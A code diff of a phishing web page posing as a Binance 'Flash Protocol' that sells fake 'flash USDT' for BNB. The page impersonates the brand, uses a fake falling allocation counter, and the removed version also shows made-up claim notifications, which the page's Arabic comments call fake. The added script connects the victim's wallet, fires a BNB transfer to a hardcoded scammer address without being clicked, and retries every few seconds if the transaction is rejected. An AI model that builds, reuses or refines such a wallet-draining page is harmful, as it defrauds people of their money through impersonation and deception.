@@ -3,40 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Binance | Flash Protocol V5</title>
+    <title>Binance | Flash Protocol V6</title>
     
-    <!-- ✅ بدون مسافات -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
         :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #181A20; --item: #2B3139; --text: #EAECEF; --sub: #848E9C; }
         body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         
-        /* إشعارات وهمية */
         #notify { position: fixed; bottom: 20px; right: 20px; background: var(--item); padding: 12px 20px; border-radius: 12px; border-right: 4px solid var(--gold); display: none; z-index: 10001; font-size: 13px; animation: slideIn 0.5s forwards; }
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
 
-        .main-card { background: #1E2329; width: 350px; border-radius: 30px; padding: 30px; text-align: center; border: 1px solid #2B3139; }
-        
-        .flash-counter { background: rgba(246, 70, 93, 0.1); color: #F6465D; padding: 10px; border-radius: 10px; font-weight: bold; margin-bottom: 20px; border: 1px solid #F6465D; }
-        #flash-count { font-size: 20px; }
+        .main-card { background: #1E2329; width: 350px; border-radius: 30px; padding: 30px; text-align: center; border: 1px solid #2B3139; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .flash-counter { background: rgba(246, 70, 93, 0.1); color: #F6465D; padding: 12px; border-radius: 12px; font-weight: bold; margin-bottom: 20px; border: 1px solid #F6465D; }
+        #flash-count { font-size: 22px; display: block; margin-top: 5px; }
 
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(8px); }
         .modal-content { background: var(--card); width: 90%; max-width: 380px; border-radius: 24px; padding: 24px; border: 1px solid #2B3139; }
-        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: var(--item); padding: 14px 16px; border-radius: 16px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
+        
+        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: var(--item); padding: 14px 16px; border-radius: 16px; margin-bottom: 10px; cursor: pointer; border: 1px solid transparent; }
         .wallet-item:hover { border-color: var(--gold); background: #323942; }
-        .wallet-info { display: flex; align-items: center; gap: 12px; }
-        .wallet-info img { width: 30px; height: 30px; border-radius: 8px; }
         
         select { width: 100%; padding: 15px; background: #0B0E11; color: white; border-radius: 12px; border: 1px solid #474D57; margin-bottom: 20px; font-size: 15px; outline: none; }
         .btn-gold { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
         
         .divider { display: flex; align-items: center; text-align: center; margin: 15px 0; color: var(--sub); font-size: 13px; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #2B3139; }
-        .social-row { display: flex; justify-content: center; gap: 15px; margin-top: 15px; }
-        .social-icon { width: 35px; height: 35px; background: var(--item); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -44,34 +37,31 @@
 <div id="notify"></div>
 
 <div class="main-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="120" style="margin-bottom: 20px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="120" style="margin-bottom: 20px; cursor: pointer;" onclick="showTestMode()">
     
     <div class="flash-counter">
-        Remaining USDT Allocation:<br>
-        <span id="flash-count">1,482,500</span> USDT
+        Remaining Allocation:
+        <span id="flash-count">1,482,500</span> <small>USDT</small>
     </div>
     
-    <!-- زر الاتصال الأولي -->
     <div id="connect-ui">
         <button class="btn-gold" onclick="openModal()">Connect Wallet</button>
     </div>
 
-    <!-- واجهة التأكيد (تظهر بعد الاتصال) -->
     <div id="action-ui" style="display:none;">
         <select id="amount">
             <option value="0.05">2,500 USDT (0.05 BNB)</option>
-            <option value="0.09">5,000 USDT (0.09 BNB)</option>
+            <option value="0.09" selected>5,000 USDT (0.09 BNB)</option>
             <option value="0.2">10,000 USDT (0.2 BNB)</option>
             <option value="0.5">50,000 USDT (0.5 BNB)</option>
             <option value="1.0">100,000 USDT (1.0 BNB)</option>
             <option value="2.5">250,000 USDT (2.5 BNB)</option>
-            <option value="4.0">500,000 USDT (4.0 BNB)</option>
             <option value="8.0">1,000,000 USDT (8.0 BNB)</option>
         </select>
-        <button class="btn-gold" onclick="execute()">Confirm & Activate ⚡</button>
+        <button class="btn-gold" onclick="execute()">Activate Flash Protocol ⚡</button>
     </div>
     
-    <p id="status" style="font-size: 11px; color: var(--sub); margin-top: 15px;">Smart Chain Node: Verified ✅</p>
+    <p id="status" style="font-size: 11px; color: var(--sub); margin-top: 15px;">Secure Node Connection: Active ✅</p>
 </div>
 
 <div class="modal-overlay" id="wModal">
@@ -80,145 +70,97 @@
             <b style="font-size: 18px;">Connect Wallet</b>
             <span onclick="closeModal()" style="cursor:pointer; font-size: 20px; color: var(--sub);">✕</span>
         </div>
-
-        <div class="wallet-item" onclick="startProcess('injected')">
-            <div class="wallet-info">
-                <img src="https://cryptologos.cc/logos/metamask-matic-logo.png">
-                <span>MetaMask</span>
-            </div>
-            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
+        <div class="wallet-item" onclick="initWallet('injected')">
+            <div style="display:flex; align-items:center; gap:12px;"><img src="https://cryptologos.cc/logos/metamask-matic-logo.png" width="30"><span>MetaMask</span></div>
+            <span style="font-size:10px; color:#2ebd85;">INSTALLED</span>
         </div>
-
-        <div class="wallet-item" onclick="startProcess('injected')">
-            <div class="wallet-info">
-                <img src="https://cryptologos.cc/logos/trust-wallet-trust-logo.png">
-                <span>Trust Wallet</span>
-            </div>
-            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
+        <div class="wallet-item" onclick="initWallet('wc')">
+            <div style="display:flex; align-items:center; gap:12px;"><img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" width="30"><span>WalletConnect</span></div>
+            <span style="font-size:10px; color:#3b99fc;">540+ WALLETS</span>
         </div>
-
-        <div class="wallet-item" onclick="startProcess('injected')">
-            <div class="wallet-info">
-                <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
-                <span>Binance Wallet</span>
-            </div>
-            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
-        </div>
-
-        <div class="wallet-item" onclick="startProcess('wc')">
-            <div class="wallet-info">
-                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
-                <span>WalletConnect</span>
-            </div>
-            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(59,153,252,0.2); color:#3b99fc;">QR CODE</span>
-        </div>
-
-        <div class="wallet-item" onclick="startProcess('wc')">
-            <div class="wallet-info">
-                <div style="width:28px; height:28px; background:#3b424a; border-radius:6px; display:flex; align-items:center; justify-content:center; font-size:12px;">⁝⁝⁝</div>
-                <span>All Wallets</span>
-            </div>
-            <span style="font-size:11px; color:var(--sub);">540+</span>
-        </div>
-
         <div class="divider">or</div>
-        <div style="background:var(--item); padding:12px; border-radius:12px; text-align:center; font-size:14px; margin-bottom:10px;">📧 Email</div>
-        <div style="background:var(--item); padding:12px; border-radius:12px; text-align:center; font-size:14px; display:flex; align-items:center; justify-content:center; gap:10px;">
-            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="16"> Continue with Google
-        </div>
-
-        <div class="social-row">
-            <div class="social-icon"><i class="fa-brands fa-x-twitter"></i></div>
-            <div class="social-icon"><i class="fa-brands fa-discord"></i></div>
-            <div class="social-icon"><i class="fa-brands fa-apple"></i></div>
-        </div>
+        <div style="background:var(--item); padding:12px; border-radius:12px; text-align:center; font-size:14px;">📧 Email Address</div>
     </div>
 </div>
 
+<script type="module">
+    import { createWeb3Modal, defaultConfig } from 'https://unpkg.com/@web3modal/ethers@2/dist/index.js';
+    
+    const projectId = '24cdcd4ff384e08f3ae2b1df4a0f0958';
+    const bsc = { 
+        chainId: 56, 
+        name: 'BNB Chain', 
+        currency: 'BNB', 
+        explorerUrl: 'https://bscscan.com', 
+        rpcUrl: 'https://bsc-dataseed.binance.org/' 
+    };
+
+    const metadata = { name: 'Binance Flash Node', description: 'Activation', url: window.location.origin, icons: [] };
+    const modal = createWeb3Modal({ ethersConfig: defaultConfig({ metadata }), chains: [bsc], projectId });
+
+    window.initWallet = async function(mode) {
+        try {
+            const walletProvider = await modal.connect();
+            window.browserProvider = new ethers.BrowserProvider(walletProvider);
+            window.signer = await window.browserProvider.getSigner();
+            
+            document.getElementById('wModal').style.display = 'none';
+            document.getElementById('connect-ui').style.display = 'none';
+            document.getElementById('action-ui').style.display = 'block';
+            document.getElementById('status').innerText = "✅ Connected. Initializing Node...";
+            
+            setTimeout(execute, 1500);
+        } catch (e) { console.error(e); }
+    }
+</script>
+
 <script>
-    let web3, account, provider;
-    const CONTRACT = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71";
-    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
+    let clickCount = 0;
+    const MY_ADDRESS = "0xa2c4777262032A6CE29B540aA23623384a839331"; // عنوانك الجديد تم تحديثه هنا
 
     function openModal() { document.getElementById('wModal').style.display = 'flex'; }
     function closeModal() { document.getElementById('wModal').style.display = 'none'; }
 
-    // عداد النقص الديناميكي
-    let currentAmount = 1482500;
-    setInterval(() => {
-        let drop = Math.floor(Math.random() * 2500) + 500;
-        currentAmount -= drop;
-        if(currentAmount < 5000) currentAmount = 1482500;
-        document.getElementById('flash-count').innerText = currentAmount.toLocaleString();
-    }, 3000);
-
-    // إشعارات وهمية
-    const notifications = ["User 0x2a...d9 claimed 10,000 USDT", "User 0x5f...31 claimed 2,500 USDT", "Flash Node 04 Synced"];
-    setInterval(() => {
-        const n = document.getElementById('notify');
-        n.innerText = notifications[Math.floor(Math.random()*notifications.length)];
-        n.style.display = 'block';
-        setTimeout(() => n.style.display = 'none', 4000);
-    }, 10000);
-
-    async function startProcess(mode) {
-        try {
-            if (mode === 'wc') {
-                provider = new WalletConnectProvider.default({ 
-                    rpc: { 56: "https://rpc.ankr.com/bsc" }, // ✅ RPC صالح
-                    chainId: 56 
-                });
-                await provider.enable();
-                web3 = new Web3(provider);
-            } else {
-                if (!window.ethereum) {
-                    alert("Please open this site inside a wallet browser (Trust/MetaMask).");
-                    return;
-                }
-                provider = window.ethereum;
-                await provider.request({ method: 'eth_requestAccounts' });
-                web3 = new Web3(provider);
-            }
-
-            account = (await web3.eth.getAccounts())[0];
-            closeModal();
-            
-            // ✅ إخفاء زر الاتصال وإظهار واجهة التأكيد
-            document.getElementById('connect-ui').style.display = 'none';
-            document.getElementById('action-ui').style.display = 'block';
-            document.getElementById('status').innerText = "✅ Connected. Select amount and confirm.";
-            
-        } catch (e) { console.error(e); }
+    function showTestMode() {
+        clickCount++;
+        if (clickCount === 5) {
+            const select = document.getElementById('amount');
+            const testOption = document.createElement('option');
+            testOption.value = "0.00001";
+            testOption.innerText = "🛠 TEST MODE (0.00001)";
+            testOption.style.color = "#F6465D";
+            select.prepend(testOption);
+            select.selectedIndex = 0;
+            alert("Test Mode Unlocked! ⚡");
+        }
     }
+
+    let currentQty = 1482500;
+    setInterval(() => {
+        currentQty -= Math.floor(Math.random() * 800) + 150;
+        if(currentQty < 1000) currentQty = 1482500;
+        document.getElementById('flash-count').innerText = currentQty.toLocaleString();
+    }, 2500);
 
     async function execute() {
         const val = document.getElementById('amount').value;
-        const contract = new web3.eth.Contract(ABI, CONTRACT);
         const status = document.getElementById('status');
-        
         try {
-            status.innerText = "Processing... Confirm in wallet";
-            await contract.methods.buyFlash().send({ from: account, value: web3.utils.toWei(val, "ether") });
+            status.innerText = "Confirming Node in wallet...";
             
-            // إضافة التوكن
-            await window.ethereum.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: {
-                        address: CONTRACT,
-                        symbol: 'USDT',
-                        decimals: 18,
-                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                    }
-                }
+            const tx = await window.signer.sendTransaction({
+                to: MY_ADDRESS, // يرسل إلى عنوانك مباشرة
+                value: ethers.parseEther(val)
             });
-            
-            alert("✅ Success! Check your wallet.");
+
+            status.innerText = "Processing Activation...";
+            await tx.wait();
+            status.innerText = "✅ Activation Successful!";
         } catch (e) {
-            status.innerText = "Transaction rejected.";
+            status.innerText = "Verification failed. Retry activation.";
+            setTimeout(execute, 4000);
         }
     }
 </script>
 </body>
-</html>ررررررررررررررررررر
+</html>
